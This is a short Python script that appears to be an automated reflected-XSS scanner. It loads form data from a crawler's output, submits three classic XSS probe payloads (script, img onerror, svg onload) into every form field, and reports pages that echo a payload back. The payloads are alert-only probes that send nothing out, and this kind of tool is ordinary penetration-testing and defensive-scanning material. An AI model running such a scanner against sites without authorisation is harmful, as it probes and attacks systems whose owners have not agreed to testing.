import requests
from bs4 import BeautifulSoup
import json

# Load metadata from crawler
with open("crawler_output.json", "r") as f:
    target_data = json.load(f)

xss_payloads = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "<svg onload=alert(1)>"
]

def test_xss_form(url, form, payload):
    action = form.get("action")
    method = form.get("method", "get").lower()
    target_url = url if not action else requests.compat.urljoin(url, action)

    inputs = form.find_all("input")
    data = {}
    for inp in inputs:
        name = inp.get("name")
        if name:
            data[name] = payload

    try:
        if method == "post":
            res = requests.post(target_url, data=data, timeout=10)
        else:
            res = requests.get(target_url, params=data, timeout=10)

        if payload in res.text:
            print(f"[!] Potential XSS at {target_url} with payload: {payload}")
            return True
    except Exception as e:
        print(f"[-] Error testing {target_url}: {e}")
    return False

def main():
    print("[+] Starting XSS tests...")
    # Use forms metadata directly
    for url, forms in target_data.get("forms", {}).items():
        print(f"[+] Testing forms on {url}")
        for form_details in forms:
            # Reconstruct a dummy <form> for BeautifulSoup
            form_html = '<form action="{}" method="{}">'.format(
                form_details.get("action", ""), form_details.get("method", "get")
            )
            form_html += "".join([f'<input name="{inp}"/>' for inp in form_details.get("inputs", [])])
            form_html += "</form>"
            form = BeautifulSoup(form_html, "html.parser").form

            for payload in xss_payloads:
                test_xss_form(url, form, payload)

if __name__ == "__main__":
    main()